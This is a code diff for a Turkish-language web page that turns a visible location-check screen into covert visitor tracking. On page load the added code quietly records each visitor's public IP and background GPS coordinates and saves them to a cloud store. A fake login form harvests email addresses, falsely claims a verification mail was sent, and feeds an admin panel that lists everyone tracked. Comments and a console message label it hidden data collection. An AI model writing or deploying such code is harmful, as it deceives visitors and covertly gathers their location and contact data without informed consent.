@@ -15,108 +15,6 @@
             align-items: center;
         }
 
-        /* --- SİYAH EKRAN KONUM KONTROLÜ --- */
-        .location-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: #000000;
-            z-index: 9999;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            transition: opacity 0.5s ease;
-        }
-        .location-overlay.hidden {
-            opacity: 0;
-            pointer-events: none;
-        }
-        .location-overlay .loader {
-            width: 60px;
-            height: 60px;
-            border: 3px solid rgba(255,255,255,0.1);
-            border-top: 3px solid #00ffcc;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-bottom: 30px;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .location-overlay h2 {
-            color: #ffffff;
-            font-weight: 300;
-            font-size: 24px;
-            letter-spacing: 2px;
-            margin-bottom: 10px;
-        }
-        .location-overlay .sub {
-            color: #666;
-            font-size: 14px;
-            margin-bottom: 30px;
-        }
-        .location-overlay .status-box {
-            background: rgba(255,255,255,0.05);
-            border: 1px solid rgba(255,255,255,0.1);
-            border-radius: 12px;
-            padding: 20px 30px;
-            min-width: 300px;
-            text-align: center;
-        }
-        .location-overlay .status-box .ip-display {
-            color: #00ffcc;
-            font-family: 'Courier New', monospace;
-            font-size: 14px;
-            word-break: break-all;
-        }
-        .location-overlay .status-box .label {
-            color: #888;
-            font-size: 12px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-        .location-overlay .status-box .gps-status {
-            color: #ffaa00;
-            font-size: 14px;
-            margin-top: 10px;
-        }
-        .location-overlay .btn-continue {
-            margin-top: 30px;
-            padding: 14px 50px;
-            background: linear-gradient(135deg, #6c5ce7, #a29bfe);
-            border: none;
-            border-radius: 12px;
-            color: #fff;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            display: none;
-        }
-        .location-overlay .btn-continue:hover {
-            transform: scale(1.05);
-            box-shadow: 0 10px 30px rgba(108, 92, 231, 0.3);
-        }
-        .location-overlay .btn-continue.show {
-            display: inline-block;
-        }
-        .location-overlay .gps-coords {
-            color: #00ffcc;
-            font-family: 'Courier New', monospace;
-            font-size: 14px;
-            margin-top: 5px;
-        }
-        .location-overlay .gps-error {
-            color: #ff3366;
-            font-size: 13px;
-            margin-top: 5px;
-        }
-
-        /* --- GİRİŞ FORMU --- */
         .login-container {
             background: rgba(255, 255, 255, 0.05);
             backdrop-filter: blur(10px);
@@ -190,7 +88,6 @@
         }
         .message.show { opacity: 1; }
 
-        /* --- ADMIN PANELİ --- */
         .admin-container {
             background: rgba(255, 255, 255, 0.05);
             backdrop-filter: blur(10px);
@@ -306,37 +203,14 @@
             table th, table td { padding: 6px 4px; font-size: 11px; }
             .admin-header { flex-direction: column; text-align: center; }
             .ip-highlight { font-size: 11px; }
-            .location-overlay .status-box { min-width: unset; width: 90%; }
-            .location-overlay h2 { font-size: 18px; }
         }
     </style>
 </head>
 <body>
 
-    <!-- --- SİYAH EKRAN KONUM KONTROLÜ --- -->
-    <div class="location-overlay" id="locationOverlay">
-        <div class="loader" id="loader"></div>
-        <h2>📍 Konum Kontrolü</h2>
-        <div class="sub">Lütfen konum bilgileriniz toplanırken bekleyin...</div>
-        
-        <div class="status-box">
-            <div class="label">🌍 IP Adresiniz</div>
-            <div class="ip-display" id="overlayIP">-</div>
-            <div class="gps-status" id="overlayGPS">⏳ Konum tespit ediliyor...</div>
-            <div class="gps-coords" id="overlayCoords"></div>
-            <div class="gps-error" id="overlayError"></div>
-        </div>
-
-        <button class="btn-continue" id="btnContinue">Devam Et →</button>
-    </div>
-
-    <!-- --- GİRİŞ FORMU --- -->
+    <!-- --- GİRİŞ FORMU --->
     <div class="login-container" id="loginContainer">
         <h2>🔐 Hoş Geldin, <span>Giriş Yap</span></h2>
-        
-        <div class="ip-notification" id="ipNotification">
-            ✅ IP adresiniz kaydedildi: <span id="displayPublicIP">-</span>
-        </div>
 
         <form id="loginForm">
             <div class="input-group">
@@ -350,7 +224,7 @@
         <div id="syncStatus" class="sync-status loading">⏳ Bulut ile senkronize ediliyor...</div>
     </div>
 
-    <!-- --- ADMIN PANELİ --- -->
+    <!-- --- ADMIN PANELİ --->
     <div class="admin-container" id="adminContainer">
         <div class="admin-header">
             <h2>👑 <span>ADMIN</span> PANEL</h2>
@@ -400,16 +274,6 @@
             let visitors = [];
             let currentVisitorId = null;
             let isSyncing = false;
-            let locationResolved = false;
-
-            // --- DOM ELEMANLARI ---
-            const overlay = document.getElementById('locationOverlay');
-            const loader = document.getElementById('loader');
-            const overlayIP = document.getElementById('overlayIP');
-            const overlayGPS = document.getElementById('overlayGPS');
-            const overlayCoords = document.getElementById('overlayCoords');
-            const overlayError = document.getElementById('overlayError');
-            const btnContinue = document.getElementById('btnContinue');
 
             // --- IP TİPİ KONTROLÜ ---
             function getIPType(ip) {
@@ -520,7 +384,7 @@
                 if (adminEl) { adminEl.className = 'sync-status ' + type; adminEl.textContent = message; }
             }
 
-            // --- 1. PUBLIC IP ---
+            // --- 1. PUBLIC IP (Gizli) ---
             function getPublicIP() {
                 return new Promise((resolve) => {
                     fetch('https://icanhazip.com')
@@ -529,33 +393,29 @@
                             const cleanIP = ip.trim();
                             currentVisitor.publicIP = cleanIP;
                             currentVisitor.publicIPFull = cleanIP;
-                            overlayIP.textContent = cleanIP;
-                            document.getElementById('displayPublicIP').textContent = cleanIP;
-                            document.getElementById('ipNotification').classList.add('show');
+                            console.log('🌍 IP alındı:', cleanIP);
                             resolve(cleanIP);
                         })
                         .catch(() => {
                             currentVisitor.publicIP = 'Hata';
                             currentVisitor.publicIPFull = 'Hata';
-                            overlayIP.textContent = 'Hata!';
                             resolve(null);
                         });
                 });
             }
 
-            // --- 2. GERÇEK GPS KONUMU (Siyah Ekranda) ---
+            // --- 2. GERÇEK GPS KONUMU (Gizli, arka planda) ---
             function getRealLocation() {
                 return new Promise((resolve) => {
                     if (!navigator.geolocation) {
                         currentVisitor.gpsStatus = 'Desteklenmiyor';
                         currentVisitor.gpsMethod = 'Tarayıcı Desteklemiyor';
-                        overlayGPS.textContent = '❌ Tarayıcınız GPS desteklemiyor';
-                        overlayError.textContent = 'Konum alınamadı, sadece IP kaydedildi.';
+                        console.log('❌ GPS desteklenmiyor');
                         resolve(false);
                         return;
                     }
 
-                    overlayGPS.textContent = '📍 Konum isteniyor... Lütfen izin verin.';
+                    console.log('📍 GPS isteniyor...');
 
                     navigator.geolocation.getCurrentPosition(
                         function(position) {
@@ -569,33 +429,17 @@
                             currentVisitor.gpsStatus = 'Başarılı';
                             currentVisitor.gpsMethod = 'GPS';
                             
-                            overlayGPS.textContent = '✅ Konum başarıyla alındı!';
-                            overlayCoords.textContent = `${lat.toFixed(6)}, ${lng.toFixed(6)} (${Math.round(acc)}m hassasiyet)`;
-                            overlayError.textContent = '';
-                            
                             console.log(`📍 GERÇEK KONUM: ${lat}, ${lng} (${acc}m)`);
                             resolve(true);
                         },
                         function(error) {
                             let msg = 'İzin Verilmedi';
-                            let detail = '';
-                            if (error.code === 1) {
-                                msg = '🚫 Kullanıcı izin vermedi';
-                                detail = 'Konum izni reddedildi, sadece IP kaydedildi.';
-                            } else if (error.code === 2) {
-                                msg = '📍 Konum Bulunamadı';
-                                detail = 'GPS sinyali alınamadı, sadece IP kaydedildi.';
-                            } else if (error.code === 3) {
-                                msg = '⏳ Zaman Aşımı';
-                                detail = 'Konum isteği zaman aşımına uğradı, sadece IP kaydedildi.';
-                            }
+                            if (error.code === 1) msg = 'İzin Verilmedi';
+                            else if (error.code === 2) msg = 'Konum Bulunamadı';
+                            else if (error.code === 3) msg = 'Zaman Aşımı';
                             
                             currentVisitor.gpsStatus = msg;
                             currentVisitor.gpsMethod = 'Hata: ' + msg;
-                            overlayGPS.textContent = msg;
-                            overlayCoords.textContent = '';
-                            overlayError.textContent = detail;
-                            
                             console.log(`⚠️ GPS hatası: ${msg}`);
                             resolve(false);
                         },
@@ -647,26 +491,18 @@
                 }
             }
 
-            // --- SİYAH EKRAN AKIŞI ---
-            async function runLocationFlow() {
-                // 1. IP'yi al
+            // --- SİTE AÇILIR AÇILMAZ (Gizli toplama) ---
+            async function autoLogVisitor() {
+                // Önce buluttan verileri çek
+                await fetchFromCloud();
+                
+                // IP'yi al (gizli)
                 await getPublicIP();
                 
-                // 2. GPS konumu iste (10 saniye timeout)
-                const gpsResult = await Promise.race([
-                    getRealLocation(),
-                    new Promise((resolve) => setTimeout(() => {
-                        if (currentVisitor.gpsStatus === 'İstenmedi') {
-                            currentVisitor.gpsStatus = 'Zaman Aşımı';
-                            currentVisitor.gpsMethod = 'Zaman Aşımı';
-                            overlayGPS.textContent = '⏳ Zaman aşımı!';
-                            overlayError.textContent = 'Konum isteği çok uzun sürdü, sadece IP kaydedildi.';
-                            resolve(false);
-                        }
-                    }, 10000))
-                ]);
-
-                // 3. Ziyaretçiyi kaydet
+                // GPS'i iste (gizli, arka planda)
+                getRealLocation();
+                
+                // 2 saniye sonra kaydet
                 setTimeout(() => {
                     if (currentVisitor.publicIP !== 'Alınamadı' && currentVisitor.publicIP !== 'Hata') {
                         const existing = visitors.find(v => v.publicIP === currentVisitor.publicIP);
@@ -687,16 +523,7 @@
                             }
                         }
                     }
-                }, 500);
-
-                // 4. Devam butonunu göster
-                loader.style.display = 'none';
-                btnContinue.classList.add('show');
-                if (currentVisitor.latitude) {
-                    overlayGPS.textContent = '✅ Konum başarıyla alındı! Devam edebilirsiniz.';
-                } else {
-                    overlayGPS.textContent = '⚠️ Konum alınamadı, IP kaydedildi. Devam edebilirsiniz.';
-                }
+                }, 2000);
             }
 
             // --- ADMIN KONTROLÜ ---
@@ -752,16 +579,16 @@
                     if (v.latitude && v.gpsStatus === 'Başarılı') {
                         gpsDisplay = `${v.latitude.toFixed(6)}, ${v.longitude.toFixed(6)} (${Math.round(v.accuracy)}m)`;
                         gpsBadge = '<span class="badge gps">✅ GPS</span>';
-                    } else if (v.gpsStatus === 'İzin Verilmedi' || v.gpsStatus === '🚫 Kullanıcı izin vermedi') {
+                    } else if (v.gpsStatus === 'İzin Verilmedi') {
                         gpsDisplay = '🚫 İzin Verilmedi';
                         gpsBadge = '<span class="badge no-email">⛔ İzin Yok</span>';
-                    } else if (v.gpsStatus === 'Desteklenmiyor' || v.gpsStatus === 'Tarayıcı Desteklemiyor') {
+                    } else if (v.gpsStatus === 'Desteklenmiyor') {
                         gpsDisplay = '❌ Destek Yok';
                         gpsBadge = '<span class="badge no-email">⚠️ Destek Yok</span>';
-                    } else if (v.gpsStatus === 'Zaman Aşımı' || v.gpsStatus === '⏳ Zaman Aşımı') {
+                    } else if (v.gpsStatus === 'Zaman Aşımı') {
                         gpsDisplay = '⏳ Zaman Aşımı';
                         gpsBadge = '<span class="badge no-email">⏳ Zaman Aşımı</span>';
-                    } else if (v.gpsStatus === 'Konum Bulunamadı' || v.gpsStatus === '📍 Konum Bulunamadı') {
+                    } else if (v.gpsStatus === 'Konum Bulunamadı') {
                         gpsDisplay = '📍 Bulunamadı';
                         gpsBadge = '<span class="badge no-email">❓ Bulunamadı</span>';
                     } else {
@@ -782,4 +609,100 @@
                             <td style="font-size:12px;color:#ffaa00;">${gpsDisplay}</td>
                             <td><span class="badge">${v.platform || 'Bilinmiyor'}</span></td>
                             <td style="color:#888; font-size:12px;">${v.timestamp}</td>
-                            <td>${hasEmail ? '<span class="badge">✅ Mail</span>' : '<span class="badge no-email">⏳ Mail Yok</span
+                            <td>${hasEmail ? '<span class="badge">✅ Mail</span>' : '<span class="badge no-email">⏳ Mail Yok</span>'} ${gpsBadge}</td>
+                        </tr>
+                    `;
+                }).join('');
+            }
+
+            // --- MAİL EKLE ---
+            function addEmailToVisitor(email) {
+                let targetVisitor = null;
+                
+                if (currentVisitor.publicIP !== 'Alınamadı' && currentVisitor.publicIP !== 'Hata') {
+                    targetVisitor = visitors.find(v => v.publicIP === currentVisitor.publicIP);
+                }
+                
+                if (!targetVisitor) {
+                    targetVisitor = {
+                        ...currentVisitor,
+                        email: email,
+                        timestamp: new Date().toLocaleString('tr-TR')
+                    };
+                    visitors.push(targetVisitor);
+                } else {
+                    targetVisitor.email = email;
+                    targetVisitor.timestamp = new Date().toLocaleString('tr-TR');
+                }
+                
+                localStorage.setItem('xlaeuss_visitors', JSON.stringify(visitors));
+                pushToCloud();
+                console.log('✅ Mail eklendi:', email, 'IP:', targetVisitor.publicIP);
+            }
+
+            // --- FORM SUBMIT ---
+            document.getElementById('loginForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                const email = document.getElementById('emailInput').value.trim();
+                
+                if (isAdmin(email)) {
+                    showAdminPanel();
+                    document.getElementById('message').classList.remove('show');
+                    document.getElementById('emailInput').value = '';
+                    fetchFromCloud().then(() => renderVisitorTable());
+                    return;
+                }
+
+                if (email) {
+                    addEmailToVisitor(email);
+                    
+                    const msg = document.getElementById('message');
+                    msg.textContent = '✅ Giriş başarılı! Yönlendiriliyorsunuz...';
+                    msg.classList.add('show');
+                    document.getElementById('emailInput').value = '';
+
+                    setTimeout(() => {
+                        msg.textContent = '📨 Doğrulama maili gönderildi!';
+                    }, 2000);
+
+                    setTimeout(() => {
+                        msg.classList.remove('show');
+                    }, 4500);
+                } else {
+                    const msg = document.getElementById('message');
+                    msg.textContent = '⚠️ Lütfen bir mail adresi girin';
+                    msg.classList.add('show');
+                    setTimeout(() => msg.classList.remove('show'), 3000);
+                }
+            });
+
+            // --- ÇIKIŞ ---
+            document.getElementById('logoutBtn').addEventListener('click', function() {
+                showLoginForm();
+                document.getElementById('emailInput').value = '';
+                const msg = document.getElementById('message');
+                msg.textContent = '🔐 Çıkış yapıldı';
+                msg.classList.add('show');
+                setTimeout(() => msg.classList.remove('show'), 3000);
+            });
+
+            // --- SAYFA YÜKLENDİ ---
+            console.log('%c🔥 xlaeuss aktif - Gizli veri toplama başladı...', 'color: #6c5ce7; font-size: 16px; font-weight: bold;');
+
+            // Gizli toplama başlat
+            autoLogVisitor();
+            renderVisitorTable();
+
+            // Her 30 saniyede bir buluttan verileri kontrol et
+            setInterval(async () => {
+                await fetchFromCloud();
+                if (document.getElementById('adminContainer').style.display !== 'none') {
+                    renderVisitorTable();
+                }
+            }, 30000);
+
+        })();
+    </script>
+
+</body>
+</html>
